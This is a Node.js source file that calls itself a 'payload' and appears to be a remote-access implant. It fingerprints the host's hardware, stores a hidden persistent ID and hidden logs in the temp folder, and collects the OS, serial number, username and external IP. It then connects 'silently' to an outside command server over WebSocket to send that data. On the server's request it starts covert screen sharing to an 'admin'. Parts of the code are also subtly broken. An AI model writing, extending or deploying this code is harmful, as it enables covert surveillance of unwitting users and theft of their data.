const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const { execSync } = require('child_process');

// =====================================================
// FORCE INSTALLATION CHECK (RESTORED)
// =====================================================
try {
    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
    if (!fs.existsSync(nodeModulesPath)) {
        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
        console.log("[FORCE] Installation complete.");
    }
} catch (e) {
    console.warn("[FORCE] Could not auto-install:", e.message);
}

// --- NATIVE WEBRTC IMPORTS ---
let wrtc;
try {
    // Attempt to load the native module
    wrtc = require('@roamhq/wrtc');
} catch (e) {
    console.error("Failed to require @roamhq/wrtc:", e.message);
}

// Check if the module actually has the required exports
const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;

if (!HAS_WEBRTC) {
    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
}

const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};

// =====================================================
// CONFIGURATION
// =====================================================
const WS_URL = 'wss://server-eight-pi-39.vercel.app';
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// =====================================================
// LOGGING SYSTEM
// =====================================================
function log(msg) {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${msg}`);
    try {
        fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
        fs.appendFileSync(HIDDEN_LOG_FILE, `[${timestamp}] ${msg}\n`);
    } catch (e) {}
}

log("[INIT] Payload starting...");

// =====================================================
// HARDWARE FINGERPRINT & DETECTION
// =====================================================
function getHardwareFingerprint() {
    const mac = getMacAddress();
    const cpuSerial = getCpuSerial();
    const boardSerial = getBoardSerial();
    return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.mac;
            }
        }
    }
    return '00:00:00:00:00:00';
}

function getCpuSerial() {
    try {
        return execSync('wmic cpu get processorid').toString().split('\n')[1].trim();
    } catch (e) {
        try {
            return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim();
        } catch (e2) {
            return 'unknown_cpu';
        }
    }
}

function getBoardSerial() {
    try {
        return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim();
    } catch (e) {
        try {
            return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim();
        } catch (e2) {
            return 'unknown_board';
        }
    }
}

// ID Management
let myId = null;
try {
    if (fs.existsSync(PERSIST_FILE)) {
        const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
        if (savedId && savedId.length > 0) myId = savedId;
    }
} catch (e) {}

if (!myId) {
    myId = getHardwareFingerprint();
    try { fs.writeFileSync(PERSIST_FILE, myId); } catch (e) {}
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// =====================================================
// WEBSOCKET CONNECTION
// =====================================================
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function getExternalIP() {
    return new Promise((resolve) => {
        https.get('https://api.ipify.org?format=json', (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    resolve(json.ip);
                } catch (e) {
                    resolve('Unknown');
                }
            });
        }).on('error', () => {
            resolve('Unknown');
        });
    });
}

async function initConnection() {
    log(`[WS] Attempting silent connection to ${WS_URL}...`);

    ws = new WebSocket(WS_URL);

    ws.on('error', (err) => {
        log(`[WS] Connection error: ${err.message}`);
        isConnected = false;
    });

    ws.on('open', async () => {
        reconnectAttempts = 0;
        isConnected = true;
        log(`[WS] Connected. Sending identity...`);

        let realOsName = '';
        let realUser = '';
        let realDeviceName = os.hostname() || 'Unknown';
        let realManufacturer = '';
        let realModel = '';
        let realSerialNumber = '';
        let realCpu = '';

        const commandOptions = {
            encoding: 'utf8',
            timeout: 10000,
            stdio: ['ignore', 'pipe', 'ignore']
        };

        // Detect User's OS via PowerShell (Windows) or Shell (Mac/Linux)
        if (process.platform === 'win32') {
            try {
                realOsName = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"', commandOptions).trim();
            } catch (e) {}
            if (!realOsName) realOsName = 'Windows ' + os.release();

            try { realManufacturer = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"', commandOptions).trim(); } catch (e) {}
            try { realModel = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"', commandOptions).trim(); } catch (e) {}
            try { realSerialNumber = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"', commandOptions).trim(); } catch (e) {}
            try { realCpu = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"', commandOptions).trim(); } catch (e) {}
            try { realUser = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"', commandOptions).trim(); } catch (e) {}
            
            if (!realUser) {
                try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }
            }

        } else if (process.platform === 'darwin') {
            try {
                const macName = execSync('sw_vers -productName', commandOptions).trim();
                const macVersion = execSync('sw_vers -productVersion', commandOptions).trim();
                realOsName = [macName, macVersion].filter(Boolean).join(' ');
            } catch (e) {}
            if (!realOsName) realOsName = 'macOS ' + os.release();
            realManufacturer = 'Apple';
            try { realModel = execSync('sysctl -n hw.model', commandOptions).trim(); } catch (e) {}
            try { realSerialNumber = execSync("system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'", commandOptions).trim(); } catch (e) {}
            try { realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim(); } catch (e) { realCpu = (os.cpus()[0] && os.cpus()[0].model) || ''; }
            try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }

        } else if (process.platform === 'linux') {
            try { realOsName = execSync("grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'", commandOptions).trim(); } catch (e) {}
            if (!realOsName) realOsName = 'Linux ' + os.release();
            try { realManufacturer = execSync('cat /sys/class/dmi/id/sys_vendor', commandOptions).trim(); } catch (e) {}
            try { realModel = execSync('cat /sys/class/dmi/id/product_name', commandOptions).trim(); } catch (e) {}
            try { realSerialNumber = execSync('cat /sys/class/dmi/id/product_serial', commandOptions).trim(); } catch (e) {}
            realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
            try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }
        } else {
            realOsName = process.platform + ' ' + os.release();
            realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
            try { realUser = os.userInfo().username || 'user'; } catch (e) { realUser = 'user'; }
        }

        myIp = await getExternalIP();
        realDeviceName = os.hostname() || 'Unknown';

        // Send Data with Exact Column Names
        safeSend(JSON.stringify({
            type: 'info',
            id: myId,
            uniqueId: myId,
            fingerprint: myId,
            os: realOsName,
            arch: os.arch(),
            user: realDeviceName,
            ip: myIp,
            last_seen: Date.now(),
            status: 'Online',
            serial_number: realSerialNumber || realModel || myId
        }));

        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'request_join') handleJoinRequest();
            else if (data.type === 'offer') handleOffer(data.sdp);
            else if (data.type === 'answer') handleAnswer(data.sdp);
            else if (data.type === 'candidate') handleCandidate(data.candidate);
        } catch (e) {
            log(`[WS] Message parse error: ${e.message}`);
        }
    });

    ws.on('close', (code, reason) => {
        isConnected = false;
        log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
        setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
        reconnectAttempts++;
    });
}

function safeSend(msg) {
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
    setInterval(() => {
        if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
    }, 30000);
}

// =====================================================
// WEBRTC SCREEN SHARING
// =====================================================
let peerConnection = null;

async function captureScreenPureJS() {
    if (!peerConnection) {
        peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    }

    const transceivers = peerConnection.getTransceivers();
    transceivers.forEach(t => {
        if (t.sender.track) t.sender.stop();
    });

    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
    } catch (err) {
        log(`[WEBRTC] Screen capture error: ${err.message}`);
    }
}

function handleJoinRequest() {
    log("[JOIN] Request received. Starting screen share silently...");
    captureScreenPureJS();
}

function handleOffer(offerSDP) {
    if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
        .then(() => peerConnection.createAnswer())
        .then(answer => peerConnection.setLocalDescription(answer))
        .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
        .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
}

function handleAnswer(answerSDP) {
    if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
}

function handleCandidate(candidate) {
    if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
}

// =====================================================
// HTTP PORT LISTENER (For Render Health)
// =====================================================
const PORT = Number(process.env.PORT) || 3000;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
});

server.listen(PORT, '0.0.0.0', () => {
    log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
    log('[RENDER] Health service running. Guest registration disabled.');
});

// --- INITIALIZATION ---
initConnection();
